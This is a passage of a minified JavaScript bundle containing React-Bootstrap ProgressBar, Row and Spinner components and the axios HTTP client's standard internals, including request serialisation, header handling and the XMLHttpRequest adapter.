                className: s,
                style: a,
                variant: u,
                bsPrefix: c,
                ...d
            }, p) {
    return m.jsx("div", {
        ref: p, ...d,
        role: "progressbar",
        className: L(s, `${c}-bar`, {[`bg-${u}`]: u, [`${c}-bar-animated`]: l, [`${c}-bar-striped`]: l || i}),
        style: {width: `${nw(t, e, n)}%`, ...a},
        "aria-valuenow": t,
        "aria-valuemin": e,
        "aria-valuemax": n,
        children: o ? m.jsx("span", {className: "visually-hidden", children: r}) : r
    })
}

const Hm = f.forwardRef(({isChild: e = !1, ...t}, n) => {
    const r = {min: 0, max: 100, animated: !1, visuallyHidden: !1, striped: !1, ...t};
    if (r.bsPrefix = F(r.bsPrefix, "progress"), e) return zc(r, n);
    const {
        min: o,
        now: i,
        max: l,
        label: s,
        visuallyHidden: a,
        striped: u,
        animated: c,
        bsPrefix: d,
        variant: p,
        className: x,
        children: y,
        ...v
    } = r;
    return m.jsx("div", {
        ref: n, ...v,
        className: L(x, d),
        children: y ? L1(y, C => f.cloneElement(C, {isChild: !0})) : zc({
            min: o,
            now: i,
            max: l,
            label: s,
            visuallyHidden: a,
            striped: u,
            animated: c,
            bsPrefix: d,
            variant: p
        }, n)
    })
});
Hm.displayName = "ProgressBar";
const rw = Hm, Wm = f.forwardRef(({bsPrefix: e, className: t, as: n = "div", ...r}, o) => {
    const i = F(e, "row"), l = jp(), s = Op(), a = `${i}-cols`, u = [];
    return l.forEach(c => {
        const d = r[c];
        delete r[c];
        let p;
        d != null && typeof d == "object" ? {cols: p} = d : p = d;
        const x = c !== s ? `-${c}` : "";
        p != null && u.push(`${a}${x}-${p}`)
    }), m.jsx(n, {ref: o, ...r, className: L(t, i, ...u)})
});
Wm.displayName = "Row";
const xn = Wm, Vm = f.forwardRef(({
                                      bsPrefix: e,
                                      variant: t,
                                      animation: n = "border",
                                      size: r,
                                      as: o = "div",
                                      className: i,
                                      ...l
                                  }, s) => {
    e = F(e, "spinner");
    const a = `${e}-${n}`;
    return m.jsx(o, {ref: s, ...l, className: L(i, a, r && `${a}-${r}`, t && `text-${t}`)})
});
Vm.displayName = "Spinner";
const Km = Vm;

function Gm(e, t) {
    return function () {
        return e.apply(t, arguments)
    }
}

const {toString: ow} = Object.prototype, {getPrototypeOf: ou} = Object, ol = (e => t => {
        const n = ow.call(t);
        return e[n] || (e[n] = n.slice(8, -1).toLowerCase())
    })(Object.create(null)), gt = e => (e = e.toLowerCase(), t => ol(t) === e),
    il = e => t => typeof t === e, {isArray: mr} = Array, co = il("undefined");

function iw(e) {
    return e !== null && !co(e) && e.constructor !== null && !co(e.constructor) && Ye(e.constructor.isBuffer) && e.constructor.isBuffer(e)
}

const Qm = gt("ArrayBuffer");

function lw(e) {
    let t;
    return typeof ArrayBuffer < "u" && ArrayBuffer.isView ? t = ArrayBuffer.isView(e) : t = e && e.buffer && Qm(e.buffer), t
}

const sw = il("string"), Ye = il("function"), Xm = il("number"), ll = e => e !== null && typeof e == "object",
    aw = e => e === !0 || e === !1, Zo = e => {
        if (ol(e) !== "object") return !1;
        const t = ou(e);
        return (t === null || t === Object.prototype || Object.getPrototypeOf(t) === null) && !(Symbol.toStringTag in e) && !(Symbol.iterator in e)
    }, uw = gt("Date"), cw = gt("File"), dw = gt("Blob"), fw = gt("FileList"), pw = e => ll(e) && Ye(e.pipe), mw = e => {
        let t;
        return e && (typeof FormData == "function" && e instanceof FormData || Ye(e.append) && ((t = ol(e)) === "formdata" || t === "object" && Ye(e.toString) && e.toString() === "[object FormData]"))
    }, hw = gt("URLSearchParams"), gw = e => e.trim ? e.trim() : e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");

function vo(e, t, {allOwnKeys: n = !1} = {}) {
    if (e === null || typeof e > "u") return;
    let r, o;
    if (typeof e != "object" && (e = [e]), mr(e)) for (r = 0, o = e.length; r < o; r++) t.call(null, e[r], r, e); else {
        const i = n ? Object.getOwnPropertyNames(e) : Object.keys(e), l = i.length;
        let s;
        for (r = 0; r < l; r++) s = i[r], t.call(null, e[s], s, e)
    }
}

function Ym(e, t) {
    t = t.toLowerCase();
    const n = Object.keys(e);
    let r = n.length, o;
    for (; r-- > 0;) if (o = n[r], t === o.toLowerCase()) return o;
    return null
}

const Jm = (() => typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : global)(),
    qm = e => !co(e) && e !== Jm;

function Qs() {
    const {caseless: e} = qm(this) && this || {}, t = {}, n = (r, o) => {
        const i = e && Ym(t, o) || o;
        Zo(t[i]) && Zo(r) ? t[i] = Qs(t[i], r) : Zo(r) ? t[i] = Qs({}, r) : mr(r) ? t[i] = r.slice() : t[i] = r
    };
    for (let r = 0, o = arguments.length; r < o; r++) arguments[r] && vo(arguments[r], n);
    return t
}

const yw = (e, t, n, {allOwnKeys: r} = {}) => (vo(t, (o, i) => {
        n && Ye(o) ? e[i] = Gm(o, n) : e[i] = o
    }, {allOwnKeys: r}), e), vw = e => (e.charCodeAt(0) === 65279 && (e = e.slice(1)), e), ww = (e, t, n, r) => {
        e.prototype = Object.create(t.prototype, r), e.prototype.constructor = e, Object.defineProperty(e, "super", {value: t.prototype}), n && Object.assign(e.prototype, n)
    }, xw = (e, t, n, r) => {
        let o, i, l;
        const s = {};
        if (t = t || {}, e == null) return t;
        do {
            for (o = Object.getOwnPropertyNames(e), i = o.length; i-- > 0;) l = o[i], (!r || r(l, e, t)) && !s[l] && (t[l] = e[l], s[l] = !0);
            e = n !== !1 && ou(e)
        } while (e && (!n || n(e, t)) && e !== Object.prototype);
        return t
    }, Sw = (e, t, n) => {
        e = String(e), (n === void 0 || n > e.length) && (n = e.length), n -= t.length;
        const r = e.indexOf(t, n);
        return r !== -1 && r === n
    }, Cw = e => {
        if (!e) return null;
        if (mr(e)) return e;
        let t = e.length;
        if (!Xm(t)) return null;
        const n = new Array(t);
        for (; t-- > 0;) n[t] = e[t];
        return n
    }, Ew = (e => t => e && t instanceof e)(typeof Uint8Array < "u" && ou(Uint8Array)), kw = (e, t) => {
        const r = (e && e[Symbol.iterator]).call(e);
        let o;
        for (; (o = r.next()) && !o.done;) {
            const i = o.value;
            t.call(e, i[0], i[1])
        }
    }, Nw = (e, t) => {
        let n;
        const r = [];
        for (; (n = e.exec(t)) !== null;) r.push(n);
        return r
    }, Rw = gt("HTMLFormElement"), Tw = e => e.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function (n, r, o) {
        return r.toUpperCase() + o
    }), Bc = (({hasOwnProperty: e}) => (t, n) => e.call(t, n))(Object.prototype), jw = gt("RegExp"), Zm = (e, t) => {
        const n = Object.getOwnPropertyDescriptors(e), r = {};
        vo(n, (o, i) => {
            let l;
            (l = t(o, i, e)) !== !1 && (r[i] = l || o)
        }), Object.defineProperties(e, r)
    }, Ow = e => {
        Zm(e, (t, n) => {
            if (Ye(e) && ["arguments", "caller", "callee"].indexOf(n) !== -1) return !1;
            const r = e[n];
            if (Ye(r)) {
                if (t.enumerable = !1, "writable" in t) {
                    t.writable = !1;
                    return
                }
                t.set || (t.set = () => {
                    throw Error("Can not rewrite read-only method '" + n + "'")
                })
            }
        })
    }, _w = (e, t) => {
        const n = {}, r = o => {
            o.forEach(i => {
                n[i] = !0
            })
        };
        return mr(e) ? r(e) : r(String(e).split(t)), n
    }, Pw = () => {
    }, Lw = (e, t) => (e = +e, Number.isFinite(e) ? e : t), bl = "abcdefghijklmnopqrstuvwxyz", Uc = "0123456789",
    eh = {DIGIT: Uc, ALPHA: bl, ALPHA_DIGIT: bl + bl.toUpperCase() + Uc}, Iw = (e = 16, t = eh.ALPHA_DIGIT) => {
        let n = "";
        const {length: r} = t;
        for (; e--;) n += t[Math.random() * r | 0];
        return n
    };

function Dw(e) {
    return !!(e && Ye(e.append) && e[Symbol.toStringTag] === "FormData" && e[Symbol.iterator])
}

const Mw = e => {
    const t = new Array(10), n = (r, o) => {
        if (ll(r)) {
            if (t.indexOf(r) >= 0) return;
            if (!("toJSON" in r)) {
                t[o] = r;
                const i = mr(r) ? [] : {};
                return vo(r, (l, s) => {
                    const a = n(l, o + 1);
                    !co(a) && (i[s] = a)
                }), t[o] = void 0, i
            }
        }
        return r
    };
    return n(e, 0)
}, $w = gt("AsyncFunction"), Fw = e => e && (ll(e) || Ye(e)) && Ye(e.then) && Ye(e.catch), k = {
    isArray: mr,
    isArrayBuffer: Qm,
    isBuffer: iw,
    isFormData: mw,
    isArrayBufferView: lw,
    isString: sw,
    isNumber: Xm,
    isBoolean: aw,
    isObject: ll,
    isPlainObject: Zo,
    isUndefined: co,
    isDate: uw,
    isFile: cw,
    isBlob: dw,
    isRegExp: jw,
    isFunction: Ye,
    isStream: pw,
    isURLSearchParams: hw,
    isTypedArray: Ew,
    isFileList: fw,
    forEach: vo,
    merge: Qs,
    extend: yw,
    trim: gw,
    stripBOM: vw,
    inherits: ww,
    toFlatObject: xw,
    kindOf: ol,
    kindOfTest: gt,
    endsWith: Sw,
    toArray: Cw,
    forEachEntry: kw,
    matchAll: Nw,
    isHTMLForm: Rw,
    hasOwnProperty: Bc,
    hasOwnProp: Bc,
    reduceDescriptors: Zm,
    freezeMethods: Ow,
    toObjectSet: _w,
    toCamelCase: Tw,
    noop: Pw,
    toFiniteNumber: Lw,
    findKey: Ym,
    global: Jm,
    isContextDefined: qm,
    ALPHABET: eh,
    generateString: Iw,
    isSpecCompliantForm: Dw,
    toJSONObject: Mw,
    isAsyncFn: $w,
    isThenable: Fw
};

function U(e, t, n, r, o) {
    Error.call(this), Error.captureStackTrace ? Error.captureStackTrace(this, this.constructor) : this.stack = new Error().stack, this.message = e, this.name = "AxiosError", t && (this.code = t), n && (this.config = n), r && (this.request = r), o && (this.response = o)
}

k.inherits(U, Error, {
    toJSON: function () {
        return {
            message: this.message,
            name: this.name,
            description: this.description,
            number: this.number,
            fileName: this.fileName,
            lineNumber: this.lineNumber,
            columnNumber: this.columnNumber,
            stack: this.stack,
            config: k.toJSONObject(this.config),
            code: this.code,
            status: this.response && this.response.status ? this.response.status : null
        }
    }
});
const th = U.prototype, nh = {};
["ERR_BAD_OPTION_VALUE", "ERR_BAD_OPTION", "ECONNABORTED", "ETIMEDOUT", "ERR_NETWORK", "ERR_FR_TOO_MANY_REDIRECTS", "ERR_DEPRECATED", "ERR_BAD_RESPONSE", "ERR_BAD_REQUEST", "ERR_CANCELED", "ERR_NOT_SUPPORT", "ERR_INVALID_URL"].forEach(e => {
    nh[e] = {value: e}
});
Object.defineProperties(U, nh);
Object.defineProperty(th, "isAxiosError", {value: !0});
U.from = (e, t, n, r, o, i) => {
    const l = Object.create(th);
    return k.toFlatObject(e, l, function (a) {
        return a !== Error.prototype
    }, s => s !== "isAxiosError"), U.call(l, e.message, t, n, r, o), l.cause = e, l.name = e.name, i && Object.assign(l, i), l
};
const Aw = null;

function Xs(e) {
    return k.isPlainObject(e) || k.isArray(e)
}

function rh(e) {
    return k.endsWith(e, "[]") ? e.slice(0, -2) : e
}

function bc(e, t, n) {
    return e ? e.concat(t).map(function (o, i) {
        return o = rh(o), !n && i ? "[" + o + "]" : o
    }).join(n ? "." : "") : t
}

function zw(e) {
    return k.isArray(e) && !e.some(Xs)
}

const Bw = k.toFlatObject(k, {}, null, function (t) {
    return /^is[A-Z]/.test(t)
});

function sl(e, t, n) {
    if (!k.isObject(e)) throw new TypeError("target must be an object");
    t = t || new FormData, n = k.toFlatObject(n, {metaTokens: !0, dots: !1, indexes: !1}, !1, function (v, C) {
        return !k.isUndefined(C[v])
    });
    const r = n.metaTokens, o = n.visitor || c, i = n.dots, l = n.indexes,
        a = (n.Blob || typeof Blob < "u" && Blob) && k.isSpecCompliantForm(t);
    if (!k.isFunction(o)) throw new TypeError("visitor must be a function");

    function u(y) {
        if (y === null) return "";
        if (k.isDate(y)) return y.toISOString();
        if (!a && k.isBlob(y)) throw new U("Blob is not supported. Use a Buffer instead.");
        return k.isArrayBuffer(y) || k.isTypedArray(y) ? a && typeof Blob == "function" ? new Blob([y]) : Buffer.from(y) : y
    }

    function c(y, v, C) {
        let g = y;
        if (y && !C && typeof y == "object") {
            if (k.endsWith(v, "{}")) v = r ? v : v.slice(0, -2), y = JSON.stringify(y); else if (k.isArray(y) && zw(y) || (k.isFileList(y) || k.endsWith(v, "[]")) && (g = k.toArray(y))) return v = rh(v), g.forEach(function (w, S) {
                !(k.isUndefined(w) || w === null) && t.append(l === !0 ? bc([v], S, i) : l === null ? v : v + "[]", u(w))
            }), !1
        }
        return Xs(y) ? !0 : (t.append(bc(C, v, i), u(y)), !1)
    }

    const d = [], p = Object.assign(Bw, {defaultVisitor: c, convertValue: u, isVisitable: Xs});

    function x(y, v) {
        if (!k.isUndefined(y)) {
            if (d.indexOf(y) !== -1) throw Error("Circular reference detected in " + v.join("."));
            d.push(y), k.forEach(y, function (g, h) {
                (!(k.isUndefined(g) || g === null) && o.call(t, g, k.isString(h) ? h.trim() : h, v, p)) === !0 && x(g, v ? v.concat(h) : [h])
            }), d.pop()
        }
    }

    if (!k.isObject(e)) throw new TypeError("data must be an object");
    return x(e), t
}

function Hc(e) {
    const t = {"!": "%21", "'": "%27", "(": "%28", ")": "%29", "~": "%7E", "%20": "+", "%00": "\0"};
    return encodeURIComponent(e).replace(/[!'()~]|%20|%00/g, function (r) {
        return t[r]
    })
}

function iu(e, t) {
    this._pairs = [], e && sl(e, this, t)
}

const oh = iu.prototype;
oh.append = function (t, n) {
    this._pairs.push([t, n])
};
oh.toString = function (t) {
    const n = t ? function (r) {
        return t.call(this, r, Hc)
    } : Hc;
    return this._pairs.map(function (o) {
        return n(o[0]) + "=" + n(o[1])
    }, "").join("&")
};

function Uw(e) {
    return encodeURIComponent(e).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
}

function ih(e, t, n) {
    if (!t) return e;
    const r = n && n.encode || Uw, o = n && n.serialize;
    let i;
    if (o ? i = o(t, n) : i = k.isURLSearchParams(t) ? t.toString() : new iu(t, n).toString(r), i) {
        const l = e.indexOf("#");
        l !== -1 && (e = e.slice(0, l)), e += (e.indexOf("?") === -1 ? "?" : "&") + i
    }
    return e
}

class bw {
    constructor() {
        this.handlers = []
    }

    use(t, n, r) {
        return this.handlers.push({
            fulfilled: t,
            rejected: n,
            synchronous: r ? r.synchronous : !1,
            runWhen: r ? r.runWhen : null
        }), this.handlers.length - 1
    }

    eject(t) {
        this.handlers[t] && (this.handlers[t] = null)
    }

    clear() {
        this.handlers && (this.handlers = [])
    }

    forEach(t) {
        k.forEach(this.handlers, function (r) {
            r !== null && t(r)
        })
    }
}

const Wc = bw, lh = {silentJSONParsing: !0, forcedJSONParsing: !0, clarifyTimeoutError: !1},
    Hw = typeof URLSearchParams < "u" ? URLSearchParams : iu, Ww = typeof FormData < "u" ? FormData : null,
    Vw = typeof Blob < "u" ? Blob : null, Kw = (() => {
        let e;
        return typeof navigator < "u" && ((e = navigator.product) === "ReactNative" || e === "NativeScript" || e === "NS") ? !1 : typeof window < "u" && typeof document < "u"
    })(),
    Gw = (() => typeof WorkerGlobalScope < "u" && self instanceof WorkerGlobalScope && typeof self.importScripts == "function")(),
    pt = {
        isBrowser: !0,
        classes: {URLSearchParams: Hw, FormData: Ww, Blob: Vw},
        isStandardBrowserEnv: Kw,
        isStandardBrowserWebWorkerEnv: Gw,
        protocols: ["http", "https", "file", "blob", "url", "data"]
    };

function Qw(e, t) {
    return sl(e, new pt.classes.URLSearchParams, Object.assign({
        visitor: function (n, r, o, i) {
            return pt.isNode && k.isBuffer(n) ? (this.append(r, n.toString("base64")), !1) : i.defaultVisitor.apply(this, arguments)
        }
    }, t))
}

function Xw(e) {
    return k.matchAll(/\w+|\[(\w*)]/g, e).map(t => t[0] === "[]" ? "" : t[1] || t[0])
}

function Yw(e) {
    const t = {}, n = Object.keys(e);
    let r;
    const o = n.length;
    let i;
    for (r = 0; r < o; r++) i = n[r], t[i] = e[i];
    return t
}

function sh(e) {
    function t(n, r, o, i) {
        let l = n[i++];
        const s = Number.isFinite(+l), a = i >= n.length;
        return l = !l && k.isArray(o) ? o.length : l, a ? (k.hasOwnProp(o, l) ? o[l] = [o[l], r] : o[l] = r, !s) : ((!o[l] || !k.isObject(o[l])) && (o[l] = []), t(n, r, o[l], i) && k.isArray(o[l]) && (o[l] = Yw(o[l])), !s)
    }

    if (k.isFormData(e) && k.isFunction(e.entries)) {
        const n = {};
        return k.forEachEntry(e, (r, o) => {
            t(Xw(r), o, n, 0)
        }), n
    }
    return null
}

function Jw(e, t, n) {
    if (k.isString(e)) try {
        return (t || JSON.parse)(e), k.trim(e)
    } catch (r) {
        if (r.name !== "SyntaxError") throw r
    }
    return (n || JSON.stringify)(e)
}

const lu = {
    transitional: lh,
    adapter: ["xhr", "http"],
    transformRequest: [function (t, n) {
        const r = n.getContentType() || "", o = r.indexOf("application/json") > -1, i = k.isObject(t);
        if (i && k.isHTMLForm(t) && (t = new FormData(t)), k.isFormData(t)) return o && o ? JSON.stringify(sh(t)) : t;
        if (k.isArrayBuffer(t) || k.isBuffer(t) || k.isStream(t) || k.isFile(t) || k.isBlob(t)) return t;
        if (k.isArrayBufferView(t)) return t.buffer;
        if (k.isURLSearchParams(t)) return n.setContentType("application/x-www-form-urlencoded;charset=utf-8", !1), t.toString();
        let s;
        if (i) {
            if (r.indexOf("application/x-www-form-urlencoded") > -1) return Qw(t, this.formSerializer).toString();
            if ((s = k.isFileList(t)) || r.indexOf("multipart/form-data") > -1) {
                const a = this.env && this.env.FormData;
                return sl(s ? {"files[]": t} : t, a && new a, this.formSerializer)
            }
        }
        return i || o ? (n.setContentType("application/json", !1), Jw(t)) : t
    }],
    transformResponse: [function (t) {
        const n = this.transitional || lu.transitional, r = n && n.forcedJSONParsing, o = this.responseType === "json";
        if (t && k.isString(t) && (r && !this.responseType || o)) {
            const l = !(n && n.silentJSONParsing) && o;
            try {
                return JSON.parse(t)
            } catch (s) {
                if (l) throw s.name === "SyntaxError" ? U.from(s, U.ERR_BAD_RESPONSE, this, null, this.response) : s
            }
        }
        return t
    }],
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: {FormData: pt.classes.FormData, Blob: pt.classes.Blob},
    validateStatus: function (t) {
        return t >= 200 && t < 300
    },
    headers: {common: {Accept: "application/json, text/plain, */*", "Content-Type": void 0}}
};
k.forEach(["delete", "get", "head", "post", "put", "patch"], e => {
    lu.headers[e] = {}
});
const su = lu,
    qw = k.toObjectSet(["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"]),
    Zw = e => {
        const t = {};
        let n, r, o;
        return e && e.split(`
`).forEach(function (l) {
            o = l.indexOf(":"), n = l.substring(0, o).trim().toLowerCase(), r = l.substring(o + 1).trim(), !(!n || t[n] && qw[n]) && (n === "set-cookie" ? t[n] ? t[n].push(r) : t[n] = [r] : t[n] = t[n] ? t[n] + ", " + r : r)
        }), t
    }, Vc = Symbol("internals");

function Or(e) {
    return e && String(e).trim().toLowerCase()
}

function ei(e) {
    return e === !1 || e == null ? e : k.isArray(e) ? e.map(ei) : String(e)
}

function ex(e) {
    const t = Object.create(null), n = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
    let r;
    for (; r = n.exec(e);) t[r[1]] = r[2];
    return t
}

const tx = e => /^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(e.trim());

function Hl(e, t, n, r, o) {
    if (k.isFunction(r)) return r.call(this, t, n);
    if (o && (t = n), !!k.isString(t)) {
        if (k.isString(r)) return t.indexOf(r) !== -1;
        if (k.isRegExp(r)) return r.test(t)
    }
}

function nx(e) {
    return e.trim().toLowerCase().replace(/([a-z\d])(\w*)/g, (t, n, r) => n.toUpperCase() + r)
}

function rx(e, t) {
    const n = k.toCamelCase(" " + t);
    ["get", "set", "has"].forEach(r => {
        Object.defineProperty(e, r + n, {
            value: function (o, i, l) {
                return this[r].call(this, t, o, i, l)
            }, configurable: !0
        })
    })
}

class al {
    constructor(t) {
        t && this.set(t)
    }

    set(t, n, r) {
        const o = this;

        function i(s, a, u) {
            const c = Or(a);
            if (!c) throw new Error("header name must be a non-empty string");
            const d = k.findKey(o, c);
            (!d || o[d] === void 0 || u === !0 || u === void 0 && o[d] !== !1) && (o[d || a] = ei(s))
        }

        const l = (s, a) => k.forEach(s, (u, c) => i(u, c, a));
        return k.isPlainObject(t) || t instanceof this.constructor ? l(t, n) : k.isString(t) && (t = t.trim()) && !tx(t) ? l(Zw(t), n) : t != null && i(n, t, r), this
    }

    get(t, n) {
        if (t = Or(t), t) {
            const r = k.findKey(this, t);
            if (r) {
                const o = this[r];
                if (!n) return o;
                if (n === !0) return ex(o);
                if (k.isFunction(n)) return n.call(this, o, r);
                if (k.isRegExp(n)) return n.exec(o);
                throw new TypeError("parser must be boolean|regexp|function")
            }
        }
    }

    has(t, n) {
        if (t = Or(t), t) {
            const r = k.findKey(this, t);
            return !!(r && this[r] !== void 0 && (!n || Hl(this, this[r], r, n)))
        }
        return !1
    }

    delete(t, n) {
        const r = this;
        let o = !1;

        function i(l) {
            if (l = Or(l), l) {
                const s = k.findKey(r, l);
                s && (!n || Hl(r, r[s], s, n)) && (delete r[s], o = !0)
            }
        }

        return k.isArray(t) ? t.forEach(i) : i(t), o
    }

    clear(t) {
        const n = Object.keys(this);
        let r = n.length, o = !1;
        for (; r--;) {
            const i = n[r];
            (!t || Hl(this, this[i], i, t, !0)) && (delete this[i], o = !0)
        }
        return o
    }

    normalize(t) {
        const n = this, r = {};
        return k.forEach(this, (o, i) => {
            const l = k.findKey(r, i);
            if (l) {
                n[l] = ei(o), delete n[i];
                return
            }
            const s = t ? nx(i) : String(i).trim();
            s !== i && delete n[i], n[s] = ei(o), r[s] = !0
        }), this
    }

    concat(...t) {
        return this.constructor.concat(this, ...t)
    }

    toJSON(t) {
        const n = Object.create(null);
        return k.forEach(this, (r, o) => {
            r != null && r !== !1 && (n[o] = t && k.isArray(r) ? r.join(", ") : r)
        }), n
    }

    [Symbol.iterator]() {
        return Object.entries(this.toJSON())[Symbol.iterator]()
    }

    toString() {
        return Object.entries(this.toJSON()).map(([t, n]) => t + ": " + n).join(`
`)
    }

    get [Symbol.toStringTag]() {
        return "AxiosHeaders"
    }

    static from(t) {
        return t instanceof this ? t : new this(t)
    }

    static concat(t, ...n) {
        const r = new this(t);
        return n.forEach(o => r.set(o)), r
    }

    static accessor(t) {
        const r = (this[Vc] = this[Vc] = {accessors: {}}).accessors, o = this.prototype;

        function i(l) {
            const s = Or(l);
            r[s] || (rx(o, l), r[s] = !0)
        }

        return k.isArray(t) ? t.forEach(i) : i(t), this
    }
}

al.accessor(["Content-Type", "Content-Length", "Accept", "Accept-Encoding", "User-Agent", "Authorization"]);
k.reduceDescriptors(al.prototype, ({value: e}, t) => {
    let n = t[0].toUpperCase() + t.slice(1);
    return {
        get: () => e, set(r) {
            this[n] = r
        }
    }
});
k.freezeMethods(al);
const kt = al;

function Wl(e, t) {
    const n = this || su, r = t || n, o = kt.from(r.headers);
    let i = r.data;
    return k.forEach(e, function (s) {
        i = s.call(n, i, o.normalize(), t ? t.status : void 0)
    }), o.normalize(), i
}

function ah(e) {
    return !!(e && e.__CANCEL__)
}

function wo(e, t, n) {
    U.call(this, e ?? "canceled", U.ERR_CANCELED, t, n), this.name = "CanceledError"
}

k.inherits(wo, U, {__CANCEL__: !0});

function ox(e, t, n) {
    const r = n.config.validateStatus;
    !n.status || !r || r(n.status) ? e(n) : t(new U("Request failed with status code " + n.status, [U.ERR_BAD_REQUEST, U.ERR_BAD_RESPONSE][Math.floor(n.status / 100) - 4], n.config, n.request, n))
}

const ix = pt.isStandardBrowserEnv ? function () {
    return {
        write: function (n, r, o, i, l, s) {
            const a = [];
            a.push(n + "=" + encodeURIComponent(r)), k.isNumber(o) && a.push("expires=" + new Date(o).toGMTString()), k.isString(i) && a.push("path=" + i), k.isString(l) && a.push("domain=" + l), s === !0 && a.push("secure"), document.cookie = a.join("; ")
        }, read: function (n) {
            const r = document.cookie.match(new RegExp("(^|;\\s*)(" + n + ")=([^;]*)"));
            return r ? decodeURIComponent(r[3]) : null
        }, remove: function (n) {
            this.write(n, "", Date.now() - 864e5)
        }
    }
}() : function () {
    return {
        write: function () {
        }, read: function () {
            return null
        }, remove: function () {
        }
    }
}();

function lx(e) {
    return /^([a-z][a-z\d+\-.]*:)?\/\//i.test(e)
}

function sx(e, t) {
    return t ? e.replace(/\/+$/, "") + "/" + t.replace(/^\/+/, "") : e
}

function uh(e, t) {
    return e && !lx(t) ? sx(e, t) : t
}

const ax = pt.isStandardBrowserEnv ? function () {
    const t = /(msie|trident)/i.test(navigator.userAgent), n = document.createElement("a");
    let r;

    function o(i) {
        let l = i;
        return t && (n.setAttribute("href", l), l = n.href), n.setAttribute("href", l), {
            href: n.href,
            protocol: n.protocol ? n.protocol.replace(/:$/, "") : "",
            host: n.host,
            search: n.search ? n.search.replace(/^\?/, "") : "",
            hash: n.hash ? n.hash.replace(/^#/, "") : "",
            hostname: n.hostname,
            port: n.port,
            pathname: n.pathname.charAt(0) === "/" ? n.pathname : "/" + n.pathname
        }
    }

    return r = o(window.location.href), function (l) {
        const s = k.isString(l) ? o(l) : l;
        return s.protocol === r.protocol && s.host === r.host
    }
}() : function () {
    return function () {
        return !0
    }
}();

function ux(e) {
    const t = /^([-+\w]{1,25})(:?\/\/|:)/.exec(e);
    return t && t[1] || ""
}

function cx(e, t) {
    e = e || 10;
    const n = new Array(e), r = new Array(e);
    let o = 0, i = 0, l;
    return t = t !== void 0 ? t : 1e3, function (a) {
        const u = Date.now(), c = r[i];
        l || (l = u), n[o] = a, r[o] = u;
        let d = i, p = 0;
        for (; d !== o;) p += n[d++], d = d % e;
        if (o = (o + 1) % e, o === i && (i = (i + 1) % e), u - l < t) return;
        const x = c && u - c;
        return x ? Math.round(p * 1e3 / x) : void 0
    }
}

function Kc(e, t) {
    let n = 0;
    const r = cx(50, 250);
    return o => {
        const i = o.loaded, l = o.lengthComputable ? o.total : void 0, s = i - n, a = r(s), u = i <= l;
        n = i;
        const c = {
            loaded: i,
            total: l,
            progress: l ? i / l : void 0,
            bytes: s,
            rate: a || void 0,
            estimated: a && l && u ? (l - i) / a : void 0,
            event: o
        };
        c[t ? "download" : "upload"] = !0, e(c)
    }
}

const dx = typeof XMLHttpRequest < "u", fx = dx && function (e) {
    return new Promise(function (n, r) {
        let o = e.data;
        const i = kt.from(e.headers).normalize(), l = e.responseType;
        let s;

        function a() {
            e.cancelToken && e.cancelToken.unsubscribe(s), e.signal && e.signal.removeEventListener("abort", s)
        }

        let u;
        k.isFormData(o) && (pt.isStandardBrowserEnv || pt.isStandardBrowserWebWorkerEnv ? i.setContentType(!1) : i.getContentType(/^\s*multipart\/form-data/) ? k.isString(u = i.getContentType()) && i.setContentType(u.replace(/^\s*(multipart\/form-data);+/, "$1")) : i.setContentType("multipart/form-data"));
        let c = new XMLHttpRequest;
        if (e.auth) {
            const y = e.auth.username || "", v = e.auth.password ? unescape(encodeURIComponent(e.auth.password)) : "";
            i.set("Authorization", "Basic " + btoa(y + ":" + v))
        }
        const d = uh(e.baseURL, e.url);
        c.open(e.method.toUpperCase(), ih(d, e.params, e.paramsSerializer), !0), c.timeout = e.timeout;

        function p() {
            if (!c) return;
            const y = kt.from("getAllResponseHeaders" in c && c.getAllResponseHeaders()), C = {
                data: !l || l === "text" || l === "json" ? c.responseText : c.response,
                status: c.status,
                statusText: c.statusText,
                headers: y,
                config: e,
                request: c
            };
            ox(function (h) {
                n(h), a()
            }, function (h) {
                r(h), a()
            }, C), c = null
        }

        if ("onloadend" in c ? c.onloadend = p : c.onreadystatechange = function () {
            !c || c.readyState !== 4 || c.status === 0 && !(c.responseURL && c.responseURL.indexOf("file:") === 0) || setTimeout(p)
        }, c.onabort = function () {
            c && (r(new U("Request aborted", U.ECONNABORTED, e, c)), c = null)
        }, c.onerror = function () {
            r(new U("Network Error", U.ERR_NETWORK, e, c)), c = null
        }, c.ontimeout = function () {
            let v = e.timeout ? "timeout of " + e.timeout + "ms exceeded" : "timeout exceeded";
            const C = e.transitional || lh;
            e.timeoutErrorMessage && (v = e.timeoutErrorMessage), r(new U(v, C.clarifyTimeoutError ? U.ETIMEDOUT : U.ECONNABORTED, e, c)), c = null
        }, pt.isStandardBrowserEnv) {
            const y = (e.withCredentials || ax(d)) && e.xsrfCookieName && ix.read(e.xsrfCookieName);
            y && i.set(e.xsrfHeaderName, y)
        }
        o === void 0 && i.setContentType(null), "setRequestHeader" in c && k.forEach(i.toJSON(), function (v, C) {
            c.setRequestHeader(C, v)
        }), k.isUndefined(e.withCredentials) || (c.withCredentials = !!e.withCredentials), l && l !== "json" && (c.responseType = e.responseType), typeof e.onDownloadProgress == "function" && c.addEventListener("progress", Kc(e.onDownloadProgress, !0)), typeof e.onUploadProgress == "function" && c.upload && c.upload.addEventListener("progress", Kc(e.onUploadProgress)), (e.cancelToken || e.signal) && (s = y => {
            c && (r(!y || y.type ? new wo(null, e, c) : y), c.abort(), c = null)
        }, e.cancelToken && e.cancelToken.subscribe(s), e.signal && (e.signal.aborted ? s() : e.signal.addEventListener("abort", s)));
        const x = ux(d);
        if (x && pt.protocols.indexOf(x) === -1) {
            r(new U("Unsupported protocol " + x + ":", U.ERR_BAD_REQUEST, e));
            return
        }
        c.send(o || null)
    })
}, Ys = {http: Aw, xhr: fx};
k.forEach(Ys, (e, t) => {
